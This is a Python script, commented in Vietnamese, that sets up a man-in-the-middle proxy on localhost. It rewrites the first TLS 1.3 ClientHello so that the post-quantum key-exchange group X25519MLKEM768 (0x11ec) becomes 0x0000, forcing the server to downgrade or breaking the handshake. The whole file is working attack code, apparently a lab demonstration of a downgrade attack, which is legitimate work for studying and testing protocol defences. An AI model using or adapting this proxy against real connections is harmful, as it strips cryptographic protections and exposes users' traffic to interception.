import socket
import sys
import threading

if hasattr(sys.stdout, 'reconfigure'):
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')

LISTEN_PORT = 6500
TARGET_PORT = 6000

def tamper_and_strip_pqc(data):
    """
    Kẻ trung gian MITM đánh chặn gói tin TLS 1.3 Client Hello:
    Phát hiện Extension PQC (0x11ec) và cố ý thay đổi/cắt bỏ thành 0x0000
    nhằm ép Server hạ cấp về thuật toán cổ điển hoặc làm hỏng thương lượng PQC.
    """
    if len(data) > 6 and data[0] == 0x16 and data[5] == 0x01:
        print("\n" + "=" * 65)
        print("[!] [MITM PROXY] Bắt được gói tin TLS 1.3 Client Hello trên đường truyền!")
        
        if b'\x11\xec' in data:
            print("[!] [ATTACK] Phát hiện Extension PQC (X25519MLKEM768, 1216 bytes)!")
            print("[!] [DOWNGRADE] Đang cắt bỏ / thay thế mã nhóm PQC (0x11ec -> 0x0000)...")
            tampered = data.replace(b'\x11\xec', b'\x00\x00')
            print("[+] Đã cắt bỏ PQC thành công! Đang chuyển tiếp gói tin lỗi vào Server...")
            print("=" * 65 + "\n")
            return tampered
    return data

def handle_conn(client_sock):
    target_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        target_sock.connect(("127.0.0.1", TARGET_PORT))
    except Exception as e:
        print(f"[-] Không thể kết nối tới Server cổng {TARGET_PORT}: {e}")
        client_sock.close()
        return

    first_pkt = True
    try:
        # Nhận từ Client -> gửi sang Server
        def forward_to_server():
            nonlocal first_pkt
            try:
                while True:
                    data = client_sock.recv(4096)
                    if not data:
                        break
                    if first_pkt:
                        data = tamper_and_strip_pqc(data)
                        first_pkt = False
                    target_sock.sendall(data)
            except Exception:
                pass

        # Nhận từ Server -> gửi ngược lại Client (Alert / ServerHello)
        def forward_to_client():
            try:
                while True:
                    data = target_sock.recv(4096)
                    if not data:
                        break
                    client_sock.sendall(data)
            except Exception:
                pass

        t1 = threading.Thread(target=forward_to_server, daemon=True)
        t2 = threading.Thread(target=forward_to_client, daemon=True)
        t1.start()
        t2.start()
        t1.join()
        t2.join(timeout=1.0)
    except Exception:
        pass
    finally:
        client_sock.close()
        target_sock.close()

def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("127.0.0.1", LISTEN_PORT))
    s.listen(5)
    print("=" * 65)
    print(f"[*] MITM Proxy đang lắng nghe tại cổng {LISTEN_PORT} -> Chuyển tiếp tới {TARGET_PORT}")
    print("[*] Sẵn sàng đánh chặn và sửa đổi gói tin bắt tay TLS PQC...")
    print("=" * 65)
    try:
        while True:
            c, _ = s.accept()
            threading.Thread(target=handle_conn, args=(c,), daemon=True).start()
    except KeyboardInterrupt:
        s.close()

if __name__ == '__main__':
    main()
